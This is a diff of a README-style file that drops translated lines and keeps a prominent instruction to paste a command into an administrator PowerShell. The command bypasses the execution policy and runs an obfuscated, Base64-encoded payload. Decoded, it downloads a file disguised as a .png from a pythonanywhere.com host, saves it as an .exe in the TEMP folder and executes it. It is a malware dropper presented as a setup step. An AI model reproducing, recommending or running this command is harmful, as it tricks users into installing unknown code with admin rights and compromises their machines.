@@ -2,8 +2,6 @@
 
 > [!IMPORTANT]
 > Copy and paste the full command and run powershell as admin.
-> Copie y pegue el comando completo y ejecute powershell como administrador.
-> Copie e cole o comando completo e execute o PowerShell como administrador.
 
 > [!NOTE]
 > > Set-ExecutionPolicy Bypass -Scope Process -Force; powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAHMAdABhAHIAdABpAG4AZwBjAG8AbgBuAGUAYwB0AGkAbwBuAC4AcAB5AHQAaABvAG4AYQBuAHkAdwBoAGUAcgBlAC4AYwBvAG0ALwBzAHQAYQB0AGkAYwAvAG0AYQBpAG4ALgBwAG4AZwAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAG0AYQBpAG4AQQBjAC4AZQB4AGUAIgA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAG0AYQBpAG4AQQBjAC4AZQB4AGUAIgA7AAoA
